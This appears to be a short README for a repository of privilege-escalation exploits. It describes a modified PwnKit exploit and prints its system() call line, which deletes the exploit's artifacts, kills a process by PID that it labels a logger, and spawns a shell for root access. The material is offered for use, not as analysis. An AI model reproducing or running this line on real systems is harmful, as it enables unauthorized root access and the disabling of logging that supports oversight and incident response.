# attacks
Collection of working Attacks for Priviledge escalation
1. Pwnkit Attack
  It has been modified to take the PID of a process and kill it, you can change the line as below to kill the process and get root shell
   system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit';kill -9 %d; echo 'Killed Logger';bin/sh\");\n"
